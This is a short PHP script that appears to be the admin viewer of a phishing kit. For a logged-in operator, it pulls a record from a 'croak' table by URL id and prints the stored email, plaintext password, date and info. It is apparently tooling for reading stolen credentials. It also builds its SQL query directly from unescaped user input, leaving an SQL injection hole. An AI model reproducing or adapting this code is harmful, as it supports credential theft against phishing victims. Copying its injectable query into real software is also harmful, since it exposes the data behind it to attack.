<?php
session_start();
error_reporting(0);
if($_SESSION['user']){
include ("config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS);
mysql_select_db($DB_NADB);
$id=$_GET['id'];
$dats=mysql_query ("SELECT * FROM croak WHERE id='$id'");
$all=mysql_fetch_assoc($dats);
echo "<pre>";
echo "Email: ".$all['Email']."<br>";
echo "Pass : ".$all['Password']."<br>";
echo "Date : ".$all['Dato']."<br>";
echo "Info : ".$all['info']."<br>";
} else {header("location:../croak");}
